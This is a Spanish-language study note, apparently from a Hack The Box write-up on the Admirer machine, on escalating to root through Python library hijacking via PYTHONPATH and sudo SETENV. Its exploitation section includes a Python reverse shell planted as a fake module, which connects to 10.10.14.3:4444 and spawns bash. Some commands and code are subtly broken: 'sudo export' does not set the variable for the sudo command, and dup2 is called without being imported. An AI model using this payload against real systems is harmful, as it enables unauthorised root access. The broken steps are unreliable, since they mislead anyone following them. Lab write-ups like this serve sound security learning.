
## DESCRIPTION

Es un tipo de **Python Library Hijacking** en el que cambiamos la variable de entorno de la ruta de la librería. Normalmente editamos directamente la librería que se importa.

Se trata de cambiar la "ruta" donde se encuentran las librerias de python  ` python -c 'import sys; print sys.path'` Es decir cuando un programa en python llama a una librería lo va a buscar en las siguientes rutas:

![[Pasted image 20230225121606.png]]

La idea principal es modificar la variable $PYTHONPATH para establecer una nueva ruta donde buscan las librerias. Una vez modificada la ruta tendremos que crear un script en python que se importe. Mirar ejemplo en EXPLOTACION.

**!!NOTA IMPORTANTE!!** 
Las variables globales DEPENDEN DEL USUARIO, por lo tanto si el script al que queremos secuestrar la librería es root, entonces necesitamos crear la libreria con sudo (root).
Si exportamos la variable con `export PYTHONPATH` este valor no va a ser leido cuando lo ejecutemos con **sudo**.
Por esta razon para que la escalada de privilegios sea correcta tenemos que hacer el export con `sudo` que en este caso es posible por que tenemos en el sudoers `SETENV`

![[Pasted image 20230225121848.png]]

#### Mas información
* https://fmash16.github.io/content/writeups/hackthebox/htb-Admirer.html
* https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
* https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

## EXPLOITATION

1. Comprobamos que tenemos permisos en  `sudo -l` para escribir en las variables de entorno del usuario root SETENV.

![[Pasted image 20230225121848.png]]

2. Comprobamos que no podemos escribir sobre el fichero que importa el script (si pudieramos entonces podríasmos hacer un HIJACKING directamente).

![[Pasted image 20230225121848.png]]

3. Exportamos como sudo la variable PYTHONPATH

```
sudo export PYTHONPATH=/tmp

python -c 'import sys; print sys.path'
```

4. Creamos en esa carpeta un script igual que el que importa, en nuestro caso shutty.py que contenga una reverse shell y nos ponemos ala escucha.

```
#Reverse shell shutty.py

import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.3",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()

```

## MACHINES

* Hack The Box: Admirer
